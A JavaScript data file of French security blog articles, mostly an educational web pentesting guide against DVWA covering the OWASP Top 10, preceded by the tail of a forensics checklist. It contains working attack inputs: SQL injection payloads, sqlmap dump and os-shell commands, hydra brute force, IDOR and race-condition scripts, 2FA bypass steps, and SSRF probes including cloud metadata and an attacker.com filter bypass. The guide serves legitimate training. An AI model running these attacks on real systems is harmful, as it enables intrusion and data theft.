- Annexe A: Hashes de tous les fichiers analys√©s
- Annexe B: Logs complets
- Annexe C: Screenshots des artefacts
- Annexe D: Chain of Custody
\`\`\`

## üéì Certification et Formation Continue

### Certifications Recommand√©es
\`\`\`
ü•á GCFE - GIAC Certified Forensic Examiner
ü•à EnCE - EnCase Certified Examiner
ü•â CCE - Certified Computer Examiner
üèÖ CHFI - Computer Hacking Forensic Investigator
üéñÔ∏è CFCE - Certified Forensic Computer Examiner
\`\`\`

### Ressources Gratuites
- [SANS DFIR Posters](https://www.sans.org/posters/)
- [Digital Forensics Discord](https://discord.gg/digitalforensics)
- [r/computerforensics](https://reddit.com/r/computerforensics)
- [Forensics Wiki](https://forensicswiki.xyz)

## ‚úÖ Checklist Forensique Compl√®te

### Pr√©paration
- [ ] Documentation du cas initialis√©e
- [ ] Chain of custody d√©marr√©e
- [ ] Write-blocker connect√©
- [ ] Environnement st√©rile pr√©par√©

### Acquisition
- [ ] Image forensique cr√©√©e
- [ ] Hashes calcul√©s (MD5 + SHA256)
- [ ] Copie de v√©rification cr√©√©e
- [ ] Stockage s√©curis√© assur√©

### Analyse
- [ ] Autopsy case cr√©√©
- [ ] Tous les modules ex√©cut√©s
- [ ] Timeline g√©n√©r√©e
- [ ] Artefacts document√©s
- [ ] IOC identifi√©s
- [ ] Screenshots captur√©s

### Rapport
- [ ] Timeline document√©e
- [ ] IOC list√©s
- [ ] M√©thodologie d√©crite
- [ ] Recommandations fournies
- [ ] Rapport relu et valid√©

---
*Guide cr√©√© par l'√©quipe CyberGuard Pro*
*Derni√®re mise √† jour: 27 octobre 2025*
        `
    },

    {
        id: 104,
        category: "GUIDE",
        icon: "üéØ",
        title: "Pentesting √âthique: Votre Premier Test d'Intrusion Web (OWASP Top 10)",
        excerpt: "Apprenez √† r√©aliser un pentest web professionnel en suivant la m√©thodologie PTES et l'OWASP Top 10...",
        date: "2025-10-26",
        readTime: "30 min",
        author: "√âquipe CyberGuard",
        tags: ["Pentesting", "OWASP", "Hacking √©thique", "Web Security"],
        featured: true,
        image: "üéØ",
        content: `
# Pentesting √âthique: Votre Premier Test d'Intrusion Web

## ‚ö†Ô∏è DISCLAIMER L√âGAL

\`\`\`
üö® ATTENTION : Ce guide est destin√© UNIQUEMENT √† des fins √©ducatives
et pour tester VOS PROPRES applications ou avec autorisation √©crite.

Le piratage non autoris√© est ILL√âGAL et punissable par la loi.
Peine encourue en France: jusqu'√† 5 ans de prison + 150 000‚Ç¨ d'amende.

Utilisez UNIQUEMENT sur:
‚úÖ Vos propres applications
‚úÖ Plateformes d'entra√Ænement (HackTheBox, TryHackMe)
‚úÖ Bug Bounty programs avec scope autoris√©
‚úÖ Environnements de test avec autorisation √©crite

‚õî N'UTILISEZ JAMAIS sur:
‚ùå Sites web sans permission
‚ùå R√©seaux d'entreprise sans contrat
‚ùå Infrastructures gouvernementales
‚ùå Applications tierces sans autorisation
\`\`\`

## üéØ Objectifs du Tutoriel

√Ä la fin de ce guide, vous saurez:
- [ ] Mener une reconnaissance web compl√®te
- [ ] Identifier les vuln√©rabilit√©s OWASP Top 10
- [ ] Exploiter des failles web courantes (lab uniquement)
- [ ] Utiliser Burp Suite professionnellement
- [ ] R√©diger un rapport de pentest

**Niveau**: Interm√©diaire/Avanc√©
**Dur√©e**: 4-6 heures
**Cible**: Damn Vulnerable Web Application (DVWA)

## üìã Setup de l'Environnement

### Lab Virtuel (RECOMMAND√â)

\`\`\`bash
# 1. Installer Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# 2. T√©l√©charger DVWA
docker pull vulnerables/web-dvwa

# 3. Lancer DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# 4. Acc√©der √† DVWA
# URL: http://localhost
# Username: admin
# Password: password

# 5. T√©l√©charger Kali Linux tools
sudo apt install -y nmap nikto dirb gobuster sqlmap burpsuite

# 6. Configurer proxy Burp
# Burp ‚Üí Proxy ‚Üí Options ‚Üí Bind to port 8080
# Firefox ‚Üí Network Settings ‚Üí Manual proxy ‚Üí localhost:8080
\`\`\`

### Alternatives de Lab
\`\`\`
‚Ä¢ OWASP WebGoat - https://github.com/WebGoat/WebGoat
‚Ä¢ HackTheBox Academy - https://academy.hackthebox.com
‚Ä¢ TryHackMe - https://tryhackme.com
‚Ä¢ PortSwigger Academy - https://portswigger.net/web-security
‚Ä¢ PentesterLab - https://pentesterlab.com
\`\`\`

## üîç Phase 1: Reconnaissance (OSINT)

### √âtape 1.1: Information Gathering

\`\`\`bash
# Whois lookup
whois target.com

# DNS enumeration
dig target.com ANY
nslookup -type=ANY target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -d target.com

# Reverse IP lookup
curl "https://api.hackertarget.com/reverseiplookup/?q=192.0.2.1"

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak
\`\`\`

### √âtape 1.2: Technology Stack Detection

\`\`\`bash
# Wappalyzer (browser extension) - recommand√©
# OU en ligne de commande:

# Whatweb
whatweb target.com -v

# Nmap service detection
nmap -sV -p80,443 target.com

# Manual fingerprinting
curl -I http://target.com
# Analyser les headers:
# Server: nginx/1.18.0
# X-Powered-By: PHP/7.4.3
\`\`\`

### √âtape 1.3: Content Discovery

\`\`\`bash
# Dirb avec wordlist
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster (plus rapide)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Recherche de fichiers sp√©cifiques
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,sql

# Recherche de sous-domaines
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt
\`\`\`

**R√©sultats typiques**:
\`\`\`
http://target.com/admin
http://target.com/login.php
http://target.com/backup.sql (‚ö†Ô∏è SENSIBLE)
http://target.com/config.php.bak (‚ö†Ô∏è CRITIQUE)
http://target.com/phpinfo.php (‚ö†Ô∏è INFO DISCLOSURE)
\`\`\`

## üï∑Ô∏è Phase 2: Scanning & Enumeration

### √âtape 2.1: Nmap Scan Complet

\`\`\`bash
# Quick scan des ports courants
nmap -sV -sC target.com

# Full TCP scan (LENT - 65535 ports)
nmap -p- -T4 target.com

# UDP scan des ports critiques
nmap -sU -p 53,67,68,123,161,162 target.com

# Scan avec scripts NSE
nmap --script=http-enum,http-headers,http-methods target.com -p80,443

# Detection OS et services
nmap -A target.com
\`\`\`

**Ports Web Importants**:
\`\`\`
80    - HTTP
443   - HTTPS
8080  - HTTP Alternate
8443  - HTTPS Alternate
3000  - Node.js dev servers
5000  - Flask dev servers
8000  - Django dev servers
\`\`\`

### √âtape 2.2: Nikto Vulnerability Scan

\`\`\`bash
# Scan complet
nikto -h http://target.com

# Scan avec toutes les options
nikto -h http://target.com -Tuning 123456789 -o nikto_report.html -Format html

# Options utiles:
# -Tuning 1: Interesting File / Seen in logs
# -Tuning 2: Misconfiguration / Default File
# -Tuning 3: Information Disclosure
# -Tuning 4: Injection (XSS/Script/HTML)
# -Tuning 6: Denial of Service
\`\`\`

### √âtape 2.3: SSL/TLS Analysis

\`\`\`bash
# SSLyze
sslyze --regular target.com:443

# Testssl.sh (le plus complet)
./testssl.sh https://target.com

# V√©rifier les ciphers faibles
nmap --script ssl-enum-ciphers -p 443 target.com

# Checker en ligne
# https://www.ssllabs.com/ssltest/
\`\`\`

## üêõ Phase 3: Exploitation (OWASP Top 10)

### üî¥ A01: Broken Access Control

**Test d'Escalade de Privil√®ges**:
\`\`\`http
# 1. Acc√©der en tant qu'utilisateur normal
GET /profile?user_id=123 HTTP/1.1
Cookie: session=user_token_abc

# 2. Tenter d'acc√©der au profil admin
GET /profile?user_id=1 HTTP/1.1
Cookie: session=user_token_abc

# 3. Tenter des fonctions admin
POST /admin/delete_user HTTP/1.1
Cookie: session=user_token_abc
Content-Type: application/json

{"user_id": 456}
\`\`\`

**Test IDOR (Insecure Direct Object Reference)**:
\`\`\`bash
# Script automatis√©
for i in {1..1000}; do
    curl -H "Cookie: session=user_token" \\
         "http://target.com/api/invoice?id=$i" \\
         -o "invoice_$i.pdf"
done
\`\`\`

### üî¥ A02: Cryptographic Failures

**Test de Stockage de Mots de Passe**:
\`\`\`sql
-- Si vous avez acc√®s √† la DB (via SQLi)
SELECT username, password FROM users LIMIT 10;

-- V√©rifier le format:
-- MD5 (32 chars)     : 5f4dcc3b5aa765d61d8327deb882cf99 ‚õî FAIBLE
-- SHA1 (40 chars)    : 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 ‚õî FAIBLE
-- bcrypt (60 chars)  : $2y$10$... ‚úÖ BON
-- Argon2 (variable)  : $argon2i$... ‚úÖ EXCELLENT
\`\`\`

**Cracking Hashes**:
\`\`\`bash
# Identifier le hash
hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"

# Cracker avec hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
\`\`\`

### üî¥ A03: Injection (SQL Injection)

**Test Manuel**:
\`\`\`sql
-- 1. Test de base (boolean-based)
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin'--

-- 2. Union-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

-- 3. Time-based blind SQLi
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

-- 4. Error-based SQLi
' AND 1=CONVERT(int, (SELECT @@version))--
\`\`\`

**Automatisation avec SQLMap**:
\`\`\`bash
# Test de base
sqlmap -u "http://target.com/page.php?id=1"

# Avec cookie de session
sqlmap -u "http://target.com/page.php?id=1" \\
       --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://target.com/login.php" \\
       --data="username=admin&password=admin"

# Dump de la database
sqlmap -u "http://target.com/page.php?id=1" --dump

# Obtenir un shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
\`\`\`

### üî¥ A04: Insecure Design

**Test de Business Logic Flaws**:
\`\`\`python
# Exemple: Race condition sur un coupon de r√©duction

import requests
import threading

def use_coupon():
    session = requests.Session()
    # Login
    session.post("http://target.com/login", data={
        "username": "test",
        "password": "test"
    })

    # Utiliser le coupon (devrait √™tre one-time use)
    response = session.post("http://target.com/apply_coupon", data={
        "code": "SAVE50"
    })
    print(response.text)

# Lancer 100 threads simultan√©ment
threads = []
for i in range(100):
    t = threading.Thread(target=use_coupon)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Si l'application est vuln√©rable, le coupon sera appliqu√© plusieurs fois
\`\`\`

### üî¥ A05: Security Misconfiguration

**Checklist de Configuration**:
\`\`\`bash
# 1. Directory Listing
curl http://target.com/uploads/

# 2. Default credentials
admin:admin
admin:password
root:root
test:test

# 3. Information disclosure
http://target.com/phpinfo.php
http://target.com/.git/
http://target.com/.env
http://target.com/server-status

# 4. HTTP Methods non d√©sir√©s
curl -X OPTIONS http://target.com/
curl -X TRACE http://target.com/
curl -X DELETE http://target.com/file.txt

# 5. Headers de s√©curit√© manquants
curl -I http://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|X-Content-Type-Options"
\`\`\`

### üî¥ A06: Vulnerable Components

**Scan de D√©pendances**:
\`\`\`bash
# Retire.js (JavaScript libraries)
retire --js --jspath http://target.com

# Safety (Python packages)
safety check --json

# OWASP Dependency Check
dependency-check --scan /path/to/project

# npm audit (Node.js)
npm audit

# composer audit (PHP)
composer audit
\`\`\`

### üî¥ A07: Authentication Failures

**Test de Bruteforce (AVEC THROTTLING)**:
\`\`\`bash
# Hydra avec wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
      target.com http-post-form \\
      "/login.php:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder (recommand√©)
# 1. Capturer requ√™te de login dans Burp
# 2. Send to Intruder
# 3. Mark password field as payload position
# 4. Add wordlist
# 5. Start attack avec throttle de 1 req/sec
\`\`\`

**2FA Bypass Tests**:
\`\`\`http
# 1. Skip 2FA page
POST /login HTTP/1.1
username=admin&password=admin123

‚Üí GET /2fa HTTP/1.1
‚Üí GET /dashboard HTTP/1.1  ‚Üê Direct access

# 2. Rate limiting sur 2FA
POST /verify_2fa HTTP/1.1
code=000000
code=000001
... (test tous les codes)

# 3. Response manipulation
POST /verify_2fa HTTP/1.1
code=123456

Response: {"success": false}
Modify to: {"success": true}
\`\`\`

### üî¥ A08: Software and Data Integrity Failures

**Test de Deserialization**:
\`\`\`python
# PHP Object Injection
import base64

# Payload malveillant
payload = 'O:8:"UserAuth":1:{s:5:"admin";b:1;}'
encoded = base64.b64encode(payload.encode()).decode()

# Injecter dans cookie
# Cookie: user=<base64_payload>
\`\`\`

### üî¥ A09: Logging and Monitoring Failures

**Tests**:
\`\`\`bash
# 1. G√©n√©rer des erreurs et voir si elles sont logg√©es
sqlmap -u "http://target.com/page.php?id=1" --level=5

# 2. Test de log injection
curl "http://target.com/search?q=test%0A[CRITICAL] Fake log entry"

# 3. V√©rifier rate limiting
for i in {1..1000}; do
    curl -X POST http://target.com/login \\
         -d "username=admin&password=wrong" &
done
\`\`\`

### üî¥ A10: Server-Side Request Forgery (SSRF)

**Tests SSRF**:
\`\`\`http
# 1. Test de base
GET /fetch?url=http://localhost HTTP/1.1

# 2. Acc√®s √† metadata cloud
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

# 3. Port scanning interne
GET /fetch?url=http://192.168.1.1:22 HTTP/1.1
GET /fetch?url=http://192.168.1.1:80 HTTP/1.1
GET /fetch?url=http://192.168.1.1:3306 HTTP/1.1

# 4. Bypass de filtres
http://127.0.0.1/     ‚Üí http://127.1/
http://localhost/     ‚Üí http://[::1]/
http://internal.com/  ‚Üí http://internal.com@attacker.com/
\`\`\`

## üìù Phase 4: Reporting

### Structure du Rapport de Pentest

\`\`\`markdown
# RAPPORT DE TEST D'INTRUSION

**Client**: MegaCorp Inc.
**Date**: 27 octobre 2025
**Testeur**: Jean Dupont, OSCP
**Scope**: https://target.megacorp.com

## R√âSUM√â EX√âCUTIF

**Niveau de risque global**: üî¥ √âLEV√â

| S√©v√©rit√© | Nombre | Exemples                          |
|----------|--------|-----------------------------------|
| üî¥ Critique | 3   | SQL Injection, Auth bypass        |
| üü† √âlev√©    | 7   | XSS, CSRF, IDOR                   |
| üü° Moyen    | 12  | Info disclosure, Misconfig        |
| üü¢ Faible   | 8   | Headers manquants, Best practices |

**Recommandation prioritaire**: Corriger imm√©diatement les 3 vuln√©rabilit√©s critiques avant mise en production.

## M√âTHODOLOGIE

Framework utilis√©: OWASP Testing Guide v4.2 + PTES
Outils: Burp Suite Pro, Nmap, SQLMap, Custom scripts

Phases:
1. Reconnaissance (2 heures)
2. Scanning (3 heures)
3. Exploitation (8 heures)
4. Post-exploitation (2 heures)
5. Reporting (3 heures)

## VULN√âRABILIT√âS D√âTAILL√âES

### üî¥ [CRITIQUE] SQL Injection dans /search.php

**CVSS 3.1**: 9.8 (Critical)
**CWE**: CWE-89
**OWASP**: A03:2021 - Injection

**Description**:
Le param√®tre `q` de la page de recherche est vuln√©rable √† une injection SQL permettant √† un attaquant non authentifi√© d'extraire l'int√©gralit√© de la base de donn√©es.

**Preuve de concept**:
\`\`\`http
GET /search.php?q=test' UNION SELECT username,password,email FROM users-- HTTP/1.1
Host: target.megacorp.com

Response:
<div class="result">
  admin:$2y$10$E4h5...:admin@megacorp.com
  jdoe:5f4dcc3...:jdoe@megacorp.com
</div>
\`\`\`

**Impact**:
- ‚úó Extraction compl√®te de la base de donn√©es (2.3 millions de comptes)
- ‚úó Acc√®s aux mots de passe hach√©s (MD5 - facilement crackables)
- ‚úó Possibilit√© de modification/suppression de donn√©es
- ‚úó Potentiel d'obtenir un shell sur le serveur via INTO OUTFILE

**Remediation**:
\`\`\`php
// ‚ùå MAUVAIS (vuln√©rable)
$sql = "SELECT * FROM products WHERE name LIKE '%$q%'";

// ‚úÖ BON (utiliser prepared statements)
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE :q");
$stmt->execute(['q' => "%$q%"]);
\`\`\`

**R√©f√©rences**:
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

[... R√©p√©ter pour chaque vuln√©rabilit√© ...]

## RECOMMANDATIONS G√âN√âRALES

### Court terme (0-30 jours)
1. ‚úì Impl√©menter prepared statements sur toutes les requ√™tes SQL
2. ‚úì Activer WAF (Web Application Firewall)
3. ‚úì Forcer HTTPS avec HSTS
4. ‚úì Impl√©menter CSP (Content Security Policy)

### Moyen terme (1-3 mois)
1. ‚úì Audit de code source complet
2. ‚úì Int√©gration de SAST/DAST dans CI/CD
3. ‚úì Formation d√©veloppeurs sur OWASP Top 10
4. ‚úì Mise en place d'un Bug Bounty program

### Long terme (3-12 mois)
1. ‚úì Programme de Secure SDLC
2. ‚úì Tests d'intrusion trimestriels
3. ‚úì Obtention ISO 27001
4. ‚úì SOC avec monitoring 24/7

## ANNEXES
- Annexe A: Rapport SQLMap complet
- Annexe B: Screenshots des vuln√©rabilit√©s
- Annexe C: Logs bruts des tests
- Annexe D: Outils et versions utilis√©s
\`\`\`

## üéì Ressources pour Aller Plus Loin

### Plateformes d'Entra√Ænement
\`\`\`
üèÜ HackTheBox - https://hackthebox.com
üéØ TryHackMe - https://tryhackme.com
üé™ PentesterLab - https://pentesterlab.com
üéì PortSwigger Academy - https://portswigger.net/web-security
üí∞ HackerOne CTF - https://ctf.hacker101.com
üîê Root Me - https://www.root-me.org
\`\`\`

### Certifications
\`\`\`
ü•á OSCP - Offensive Security Certified Professional
ü•à OSWE - Offensive Security Web Expert
ü•â eWPT - eLearnSecurity Web Penetration Tester
üèÖ CEH - Certified Ethical Hacker
üéñÔ∏è GWAPT - GIAC Web Application Penetration Tester
\`\`\`

### Books
\`\`\`
üìï The Web Application Hacker's Handbook (Stuttard & Pinto)
üìó Real-World Bug Hunting (Peter Yaworski)
üìò Bug Bounty Bootcamp (Vickie Li)
üìô Web Security Testing Cookbook (Paco Hope & Ben Walther)
\`\`\`

## ‚úÖ Checklist de Pentest Web

### Pre-Engagement
- [ ] Contrat sign√© avec scope d√©fini
- [ ] Autorisation √©crite obtenue
- [ ] Fen√™tre de test d√©finie
- [ ] Points de contact √©tablis
- [ ] Lab de test configur√©

### Reconnaissance
- [ ] OSINT effectu√©
- [ ] Subdomains √©num√©r√©s
- [ ] Technology stack identifi√©
- [ ] Directory/file enumeration
- [ ] Google dorking effectu√©

### Scanning
- [ ] Port scan complet
- [ ] Service fingerprinting
- [ ] Vulnerability scan (Nikto)
- [ ] SSL/TLS analysis
- [ ] CMS detection

### Testing OWASP Top 10
- [ ] A01 - Broken Access Control test√©
- [ ] A02 - Cryptographic Failures test√©
- [ ] A03 - Injection (SQL, XSS, LDAP) test√©
- [ ] A04 - Insecure Design test√©
- [ ] A05 - Security Misconfiguration test√©
- [ ] A06 - Vulnerable Components test√©
- [ ] A07 - Authentication Failures test√©
- [ ] A08 - Data Integrity Failures test√©
- [ ] A09 - Logging Failures test√©
- [ ] A10 - SSRF test√©

### Exploitation
- [ ] Vuln√©rabilit√©s critiques exploit√©es
- [ ] Preuves de concept cr√©√©es
- [ ] Screenshots captur√©s
- [ ] Impact document√©

### Post-Exploitation
- [ ] Persistence test√©e
- [ ] Lateral movement test√©
- [ ] Data exfiltration test√©e
- [ ] Privilege escalation test√©e

### Reporting
- [ ] Rapport r√©dig√©
- [ ] Vuln√©rabilit√©s class√©es (CVSS)
- [ ] Recommandations fournies
- [ ] Executive summary r√©dig√©
- [ ] Rapport relu et valid√©

---
*Guide cr√©√© par CyberGuard Pro - Ethical Hacking Team*
*Derni√®re mise √† jour: 26 octobre 2025*
        `
    }
];

// Export pour utilisation dans le syst√®me existant
if (typeof module !== 'undefined' && module.exports) {
    module.exports = enrichedBlogArticles;
}
